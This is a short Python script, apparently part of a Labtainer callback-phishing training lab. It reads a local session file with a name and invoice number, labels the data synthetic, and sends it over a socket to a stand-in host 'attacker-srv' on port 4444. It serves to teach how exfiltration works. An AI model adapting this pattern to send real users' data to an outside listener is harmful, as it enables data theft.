#!/usr/bin/env python3
import json
import os
import socket
from datetime import datetime, timezone

HOST = "attacker-srv"
PORT = 4444

SESSION_FILE = os.path.expanduser("~/session_data.json")
LOG_FILE = os.path.expanduser("~/victim_callback.log")

if not os.path.exists(SESSION_FILE):
    print("[callback_client] ERROR: session_data.json not found.")
    print("[callback_client] Run python3 call_support.py first.")
    raise SystemExit(1)

with open(SESSION_FILE, "r", encoding="utf-8") as f:
    session = json.load(f)

name = session.get("name", "Victim Lab")
invoice = session.get("invoice", "INV-LAB-001")

content = (
    "SYNTHETIC TRAINING DATA ONLY\n"
    f"Name: {name}\n"
    f"Invoice: {invoice}\n"
    "Classification: FAKE-DATA-FOR-LAB\n"
)

payload = {
    "lab": "callback-phishing",
    "type": "synthetic-training-data",
    "synthetic_secret": content,
}

print(f"[callback_client] Connecting to {HOST}:{PORT} inside the Labtainer network...")

with socket.create_connection((HOST, PORT), timeout=5) as sock:
    sock.sendall(json.dumps(payload).encode("utf-8"))

timestamp = datetime.now(timezone.utc).isoformat()

with open(LOG_FILE, "a", encoding="utf-8") as f:
    f.write(f"{timestamp} CALLBACK_SENT\n")

print("CALLBACK_SENT")
print("[callback_client] Lab-only callback completed.")
print(f"[callback_client] Sent session data for: {name} / {invoice}")
